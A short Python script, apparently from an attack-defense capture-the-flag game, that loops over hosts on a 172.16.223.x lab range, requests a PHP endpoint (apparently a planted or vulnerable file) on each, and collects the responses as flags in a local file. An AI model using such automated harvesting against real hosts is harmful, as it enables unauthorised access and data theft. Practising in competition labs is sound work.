import requests
f = open(r'I:\python visual studio code\ctf\flag.txt', 'w+')
f.write(str(''))
f = open(r'I:\python visual studio code\ctf\cookie.txt', 'r')
g = f.readlines()
for i in g:
    url = 'http://172.16.223.'+str(i[:3])+'/protected/include/core/db/con.php'
    flag = requests.get(url).text
    file = open(r'I:\python visual studio code\ctf\flag.txt', 'a+')
    file.write(str(i[:3])+':'+str(flag)+'\n')
    file.close()
    print(str(i[:3])+'执行完毕')

